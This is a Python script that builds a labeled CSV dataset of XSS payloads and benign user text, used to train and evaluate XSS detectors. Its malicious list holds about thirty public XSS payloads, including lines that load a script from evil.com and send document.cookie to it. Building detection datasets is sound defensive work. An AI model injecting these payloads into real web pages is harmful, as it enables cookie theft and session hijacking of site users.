"""
build_dataset.py

Builds a labeled CSV dataset of malicious (XSS) and benign text samples,
used to train and evaluate both the rule-based and ML-based detectors.

Output: data/xss_dataset.csv with columns [text, label]
  label = 1 -> malicious (XSS payload)
  label = 0 -> benign (normal user input)
"""

import csv
import random
from pathlib import Path

# ---------------------------------------------------------------------------
# 1. Malicious samples: well-known, publicly documented XSS payload patterns
#    (the same kind used in security training labs like DVWA / OWASP).
# ---------------------------------------------------------------------------
MALICIOUS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<script src=http://evil.com/x.js></script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert(1)>",
    "<a href=javascript:alert('XSS')>click</a>",
    "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "\"><script>alert(1)</script>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
    "<script>fetch('http://evil.com/?c='+document.cookie)</script>",
    "javascript:alert(1)",
    "javascript:alert('XSS')",
    "<img src=\"x\" onerror=\"alert(document.cookie)\">",
    "<IMG SRC=JaVaScRiPt:alert('XSS')>",
    "<img src=x:alert(alt) onerror=eval(src) alt=xss>",
    "<div onmouseover=\"alert('XSS')\">hover me</div>",
    "<style>@import 'javascript:alert(1)';</style>",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "<ScRiPt>alert(1)</sCrIpT>",
]

# ---------------------------------------------------------------------------
# 2. Benign samples: normal, everyday user input you'd expect in comment
#    boxes, search fields, forms, etc.
# ---------------------------------------------------------------------------
BENIGN_SAMPLES = [
    "Great article, thanks for sharing!",
    "Can you send me the invoice for last month?",
    "My order number is 48213, it hasn't arrived yet.",
    "Looking forward to the meeting on Thursday.",
    "The weather in Ghaziabad is really nice today.",
    "Please update my shipping address to the new flat.",
    "I love this product, will buy again.",
    "What time does the store close today?",
    "This is a test comment for the blog post.",
    "Thanks, that resolved my issue completely.",
    "Could you please share the updated pricing sheet?",
    "The login page keeps showing a blank screen for me.",
    "Happy birthday! Hope you have a wonderful day.",
    "I'd like to cancel my subscription starting next month.",
    "The recipe turned out great, thanks for posting it.",
    "Is there a discount available for students?",
    "My name is Rahul and I'm reaching out about the internship.",
    "The report is attached, let me know if changes are needed.",
    "Excellent customer service, resolved in minutes.",
    "Can we reschedule our call to 4 PM tomorrow?",
    "5 < 10 and 10 > 5, basic math check.",
    "Use the & symbol to join two conditions in the query.",
    "The <b>bold</b> tag makes text stand out in HTML.",
    "Email me at test@example.com for more details.",
    "Price range: $10 - $50 depending on size.",
    "I scored 85 marks in my last exam.",
    "Please find below my feedback on the new UI design.",
    "The train departs at 6:45 AM from platform 2.",
    "Congratulations on your promotion, well deserved!",
    "Let's meet at the library at 3 PM to study.",
]


def build_rows():
    rows = []
    for payload in MALICIOUS_PAYLOADS:
        rows.append((payload, 1))
    for sample in BENIGN_SAMPLES:
        rows.append((sample, 0))
    random.shuffle(rows)
    return rows


def main():
    out_dir = Path(__file__).resolve().parent.parent / "data"
    out_dir.mkdir(exist_ok=True)
    out_path = out_dir / "xss_dataset.csv"

    rows = build_rows()
    with open(out_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["text", "label"])
        writer.writerows(rows)

    n_mal = sum(1 for _, label in rows if label == 1)
    n_ben = sum(1 for _, label in rows if label == 0)
    print(f"Wrote {len(rows)} rows to {out_path}")
    print(f"  malicious: {n_mal}")
    print(f"  benign:    {n_ben}")
    print("\nNOTE: this starter set is small (~60 rows) — enough to build and")
    print("sanity-check the pipeline. Before the Week 5 evaluation, expand it:")
    print("add more payload variants (encoded/obfuscated forms) and a wider")
    print("range of benign text, so the anomaly detector's benign-only training")
    print("set reflects real variety and the false-positive rate is meaningful.")


if __name__ == "__main__":
    main()
